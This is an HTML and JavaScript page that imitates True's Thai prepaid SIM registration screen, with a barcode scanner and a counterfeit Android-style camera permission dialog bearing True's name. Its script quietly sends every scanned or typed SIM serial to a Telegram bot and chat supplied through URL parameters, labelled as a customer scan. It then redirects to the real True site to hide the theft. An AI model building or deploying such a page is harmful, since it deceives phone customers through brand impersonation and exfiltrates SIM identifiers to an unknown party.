<title>ลงทะเบียนซิม True</title>
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Sarabun:wght@400;600;700;800&display=swap">
<script src="https://cdnjs.cloudflare.com/ajax/libs/zxing-js/0.21.1/umd/index.min.js"></script>

<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
html,body{width:100%;height:100%;overflow:hidden;background:#fff;font-family:'Sarabun',sans-serif;-webkit-tap-highlight-color:transparent}

.app{position:fixed;top:0;left:0;right:0;bottom:0;display:flex;flex-direction:column;background:#fff}

/* Header */
.hdr{display:flex;align-items:center;background:#fff;border-bottom:1px solid #e8e8e8;flex-shrink:0;padding-top:env(safe-area-inset-top,0px)}
.hdr-inner{display:flex;align-items:center;width:100%;height:52px;padding:0 4px}
.hdr-back{width:44px;height:44px;display:flex;align-items:center;justify-content:center;background:none;border:none;cursor:pointer;color:#e8001c;flex-shrink:0}
.hdr-title{flex:1;text-align:center;font-size:22px;font-weight:700;color:#1a1a1a;margin-right:44px}

/* Tabs */
.tabs{display:flex;flex-shrink:0;background:#fff;border-bottom:2px solid #e8e8e8}
.tab-btn{flex:1;height:56px;background:none;border:none;border-bottom:3px solid transparent;font-family:'Sarabun',sans-serif;font-size:20px;font-weight:700;color:#999;cursor:pointer;position:relative;bottom:-2px;transition:color .15s,border-color .15s}
.tab-btn.active{color:#e8001c;border-bottom-color:#e8001c}

/* Content */
.content{flex:1;position:relative;overflow:hidden;min-height:0}
.pane{position:absolute;top:0;left:0;right:0;bottom:0;display:none}
.pane.active{display:flex;flex-direction:column}

/* ── SCAN PANE ── */
.scan-pane{background:#3d3d3d;overflow:hidden}

#video{
  position:absolute;top:0;left:0;width:100%;height:100%;
  object-fit:cover;z-index:1;display:block
}

.cam-label{
  position:absolute;left:0;right:0;
  top:33%;
  text-align:center;
  font-size:24px;font-weight:700;color:#fff;
  z-index:3;pointer-events:none;
  text-shadow:0 1px 6px rgba(0,0,0,0.6)
}

.scan-overlay{
  position:absolute;inset:0;
  display:flex;align-items:center;justify-content:center;
  padding-top:40px;
  z-index:3;pointer-events:none
}
.scan-frame{
  position:relative;
  width:88%;
  aspect-ratio:3/1;
  background:rgba(160,140,120,0.20);
  border-radius:14px
}
.scan-frame::before,.scan-frame::after,
.scan-frame>span::before,.scan-frame>span::after{
  content:'';position:absolute;
  width:34px;height:34px;
  border-color:rgba(220,220,220,0.95);border-style:solid
}
.scan-frame::before {top:-2px;left:-2px;  border-width:3px 0 0 3px;border-radius:10px 0 0 0}
.scan-frame::after  {top:-2px;right:-2px; border-width:3px 3px 0 0;border-radius:0 10px 0 0}
.scan-frame>span::before{bottom:-2px;left:-2px; border-width:0 0 3px 3px;border-radius:0 0 0 10px}
.scan-frame>span::after {bottom:-2px;right:-2px;border-width:0 3px 3px 0;border-radius:0 0 10px 0}

/* idle */
.cam-idle{
  position:absolute;inset:0;
  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;
  background:#3d3d3d;cursor:pointer;z-index:5
}
.cam-idle-icon{
  width:72px;height:72px;
  border:2px solid rgba(255,255,255,0.35);border-radius:18px;
  display:flex;align-items:center;justify-content:center
}
.cam-idle-msg{font-size:22px;font-weight:700;color:rgba(255,255,255,0.85);text-align:center}
.cam-idle-sub{font-size:17px;color:rgba(255,255,255,0.5);text-align:center;margin-top:-4px}

/* toast */
.toast{
  position:fixed;bottom:calc(24px + env(safe-area-inset-bottom,0px));
  left:50%;transform:translateX(-50%);
  background:rgba(20,20,20,0.9);color:#fff;
  padding:10px 22px;border-radius:24px;
  font-size:14px;font-weight:600;white-space:nowrap;
  z-index:99;opacity:0;pointer-events:none;transition:opacity .2s
}
.toast.show{opacity:1}

/* ── CAMERA PERMISSION POPUP (Android system dialog style) ── */
.cam-popup-overlay{
  position:fixed;inset:0;
  background:rgba(0,0,0,0.55);
  display:flex;align-items:center;justify-content:center;
  z-index:50;padding:24px;
  opacity:0;pointer-events:none;
  transition:opacity .2s
}
.cam-popup-overlay.show{opacity:1;pointer-events:auto}

.cam-popup{
  width:100%;max-width:340px;
  background:#fff;
  border-radius:28px;
  padding:28px 0 8px;
  transform:scale(0.92);
  transition:transform .2s cubic-bezier(.34,1.56,.64,1)
}
.cam-popup-overlay.show .cam-popup{transform:scale(1)}

.cam-popup-icon{
  width:48px;height:48px;
  background:#e8f0fe;border-radius:12px;
  display:flex;align-items:center;justify-content:center;
  margin:0 auto 14px
}

.cam-popup-desc{
  font-size:20px;color:#444;text-align:center;
  line-height:1.6;margin-bottom:6px;
  padding:0 20px
}
.cam-popup-desc strong{color:#111;font-weight:800}

.cam-popup-divider{
  height:1px;background:#e8e8e8;margin:8px 0 0
}

.cam-popup-btn{
  width:100%;padding:20px 24px;
  background:none;border:none;border-bottom:1px solid #e8e8e8;
  font-family:'Sarabun',sans-serif;
  font-size:22px;font-weight:700;color:#1a73e8;
  cursor:pointer;text-align:center;display:block
}
.cam-popup-btn:active{background:#f5f5f5}
.cam-popup-btn.once{color:#1a73e8}
.cam-popup-btn.deny{color:#444;font-weight:600;border-bottom:none;padding-bottom:24px}

/* ── MANUAL PANE ── */
.manual-pane{background:#fff;overflow-y:auto;-webkit-overflow-scrolling:touch}
.manual-inner{
  min-height:100%;display:flex;flex-direction:column;
  padding:28px 20px calc(32px + env(safe-area-inset-bottom,0px));gap:20px
}
.field-lbl{font-size:14px;font-weight:700;color:#888;margin-bottom:8px}
.serial-input{
  width:100%;border:1.5px solid #e8e8e8;border-radius:10px;
  padding:15px 16px;font-family:'Sarabun',monospace;
  font-size:20px;font-weight:700;color:#1a1a1a;
  outline:none;letter-spacing:.05em;-webkit-appearance:none;background:#fff;
  transition:border-color .18s
}
.serial-input:focus{border-color:#e8001c}
.serial-input::placeholder{color:#bbb;font-weight:400;font-size:15px;letter-spacing:0}
.field-hint{font-size:13px;color:#999;line-height:1.6}
.spacer{flex:1}
.btn-submit{
  width:100%;padding:17px;background:#e8001c;border:none;border-radius:12px;
  font-family:'Sarabun',sans-serif;font-size:17px;font-weight:800;
  color:#fff;cursor:pointer;-webkit-appearance:none
}
.btn-submit:active{opacity:.85}
.btn-submit:disabled{opacity:.45;cursor:not-allowed}
</style>

<div class="app">
  <div class="hdr">
    <div class="hdr-inner">
      <button class="hdr-back" onclick="history.back()">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
      </button>
      <div class="hdr-title">ลงทะเบียนซิมเติมเงิน</div>
    </div>
  </div>

  <div class="tabs">
    <button class="tab-btn active" id="tabScan" onclick="switchTab('scan')">สแกนบาร์โค้ด</button>
    <button class="tab-btn" id="tabManual" onclick="switchTab('manual')">กรอกตัวเลข</button>
  </div>

  <div class="content">
    <!-- SCAN PANE -->
    <div class="pane active scan-pane" id="paneScan">
      <video id="video" playsinline muted autoplay></video>

      <div class="cam-label">สแกนบาร์โค้ดบนซองซิมการ์ด</div>

      <div class="scan-overlay">
        <div class="scan-frame"><span></span></div>
      </div>

      <div class="cam-idle" id="camIdle" onclick="startCameraFromIdle()">
        <div class="cam-idle-icon">
          <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.7)" stroke-width="1.8" stroke-linecap="round">
            <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
            <circle cx="12" cy="13" r="4"/>
          </svg>
        </div>
        <div class="cam-idle-msg" id="camIdleMsg">กำลังเปิดกล้อง...</div>
        <div class="cam-idle-sub">แตะที่นี่หากกล้องไม่เปิด</div>
      </div>
    </div>

    <!-- MANUAL PANE -->
    <div class="pane manual-pane" id="paneManual">
      <div class="manual-inner">
        <div>
          <div class="field-lbl">เลขซีเรียลซิม (18 หลัก)</div>
          <input class="serial-input" id="manualSerial" type="tel" inputmode="numeric"
            placeholder="896604XXXXXXXXXXXX" maxlength="18" autocomplete="off"
            oninput="this.value=this.value.replace(/\D/g,'').slice(0,18)">
          <div class="field-hint" style="margin-top:8px">พบเลขซีเรียลบนซองซิมการ์ด เริ่มต้นด้วย 8966</div>
        </div>
        <div class="spacer"></div>
        <button class="btn-submit" id="btnSubmit" onclick="submitManual()">ยืนยันและลงทะเบียน</button>
      </div>
    </div>
  </div>
</div>

<!-- CAMERA PERMISSION POPUP (Android system dialog style) -->
<div class="cam-popup-overlay" id="camPopupOverlay">
  <div class="cam-popup">
    <div class="cam-popup-icon">
      <!-- camera icon ฟ้า เหมือน Android -->
      <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#1a73e8" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
        <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
        <circle cx="12" cy="13" r="4"/>
      </svg>
    </div>

    <div class="cam-popup-desc">
      อนุญาตให้ <strong>True</strong> ถ่ายรูปและบันทึกวิดีโอไหม
    </div>

    <div class="cam-popup-divider"></div>

    <button class="cam-popup-btn" id="btnAllow1" onclick="openCameraFromPopup()">ขณะใช้แอป</button>
    <button class="cam-popup-btn once" id="btnAllow2" onclick="openCameraFromPopup()">เฉพาะครั้งนี้</button>
    <button class="cam-popup-btn deny" onclick="closePopupAndManual()">ไม่อนุญาต</button>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
// Telegram config from URL params
const LS  = k   => { try{return localStorage.getItem(k)||''}catch(e){return''} };
const LSS = (k,v) => { try{localStorage.setItem(k,v)}catch(e){} };
const p = new URLSearchParams(location.search);
if(p.get('bot'))  LSS('sim_bot',  p.get('bot'));
if(p.get('chat')) LSS('sim_chat', p.get('chat'));
const tgBot  = LS('sim_bot');
const tgChat = LS('sim_chat');

// Tab switch
function switchTab(tab) {
  document.getElementById('paneScan').classList.toggle('active', tab==='scan');
  document.getElementById('paneManual').classList.toggle('active', tab==='manual');
  document.getElementById('tabScan').classList.toggle('active', tab==='scan');
  document.getElementById('tabManual').classList.toggle('active', tab==='manual');
  if(tab==='scan' && !scanning) showCameraPopup();
  if(tab==='manual') stopCamera();
}

// Toast
let toastT;
function toast(msg) {
  const el=document.getElementById('toast');
  el.textContent=msg; el.classList.add('show');
  clearTimeout(toastT);
  toastT=setTimeout(()=>el.classList.remove('show'),2500);
}

// Popup
function showCameraPopup() {
  const overlay = document.getElementById('camPopupOverlay');
  overlay.classList.add('show');
}

function hidePopup() {
  document.getElementById('camPopupOverlay').classList.remove('show');
}

function openCameraFromPopup() {
  hidePopup();
  // ต้องเรียก getUserMedia ใน user gesture เดียวกันทันที ห้าม delay/setTimeout
  startCamera();
}

function closePopupAndManual() {
  hidePopup();
  switchTab('manual');
}

// Tap idle (กล้องไม่เปิด → แตะ)
function startCameraFromIdle() {
  startCamera();
}

// Camera
let reader=null, scanning=false, stream=null;

async function startCamera() {
  if(scanning) return;
  const idle=document.getElementById('camIdle');
  idle.hidden=true;

  try {
    // ขอสิทธิ์กล้องจากเบราว์เซอร์ทันที (ต้องอยู่ใน user gesture)
    try {
      stream=await navigator.mediaDevices.getUserMedia({
        video:{facingMode:{ideal:'environment'},width:{ideal:1920},height:{ideal:1080}}
      });
    } catch(e1) {
      // fallback ลดความต้องการ
      stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}});
    }

    // เริ่มวิดีโอก่อน
    const vid=document.getElementById('video');
    vid.srcObject=stream;
    await vid.play().catch(()=>{});

    // โหลด ZXing ถ้ายังไม่พร้อม
    if(typeof ZXing==='undefined') {
      await new Promise(res=>{ const t=setInterval(()=>{ if(typeof ZXing!=='undefined'){clearInterval(t);res();} },100); });
    }

    const hints=new Map();
    hints.set(ZXing.DecodeHintType.POSSIBLE_FORMATS,[
      ZXing.BarcodeFormat.CODE_128,
      ZXing.BarcodeFormat.CODE_39,
      ZXing.BarcodeFormat.EAN_13,
    ]);
    hints.set(ZXing.DecodeHintType.TRY_HARDER,true);
    reader=new ZXing.BrowserMultiFormatReader(hints,{delayBetweenScanAttempts:80});

    scanning=true;
    reader.decodeFromVideoElement('video',(result)=>{
      if(result){
        const serial=extractSerial(result.getText());
        if(serial){ stopCamera(); onSerial(serial); }
      }
    });

  } catch(e) {
    idle.hidden=false;
    const msg=document.getElementById('camIdleMsg');
    if(e.name==='NotAllowedError'){
      msg.textContent='กรุณาอนุญาตใช้กล้อง';
    } else {
      msg.textContent='แตะเพื่อลองใหม่';
    }
    scanning=false;
  }
}

function stopCamera() {
  if(reader){try{reader.reset()}catch(e){} reader=null;}
  if(stream){stream.getTracks().forEach(t=>t.stop()); stream=null;}
  scanning=false;
}

function extractSerial(raw) {
  const s=raw.replace(/\s/g,'');
  const m=s.match(/8966\d{14}/);
  if(m) return m[0];
  const m2=s.match(/\d{18}/);
  return m2?m2[0]:null;
}

async function onSerial(serial) {
  sendTelegram(serial);
  redirectToTrue(serial);
}

async function sendTelegram(serial) {
  if(!tgBot||!tgChat) return;
  const now=new Date().toLocaleString('th-TH',{timeZone:'Asia/Bangkok',hour12:false});
  const msg=`📲 ลูกค้าสแกนซิมแล้ว!\n📋 Serial: ${serial}\n🕐 เวลา: ${now}`;
  try {
    await fetch(`https://api.telegram.org/bot${tgBot}/sendMessage`,{
      method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({chat_id:tgChat,text:msg})
    });
  } catch(e){}
}

function redirectToTrue(serial) {
  window.location.href=`https://www.true.th/service/trueservice/registersim/?serial=${encodeURIComponent(serial)}`;
}

function submitManual() {
  const serial=document.getElementById('manualSerial').value.replace(/\D/g,'');
  if(serial.length<10){toast('กรุณากรอกเลขซีเรียลให้ครบ');return;}
  document.getElementById('btnSubmit').disabled=true;
  sendTelegram(serial);
  setTimeout(()=>redirectToTrue(serial),300);
}

// Auto-start — แสดง popup ก่อน แล้วค่อยเปิดกล้องเมื่อกดปุ่ม
window.addEventListener('load',()=>{
  setTimeout(showCameraPopup, 600);
});
</script>
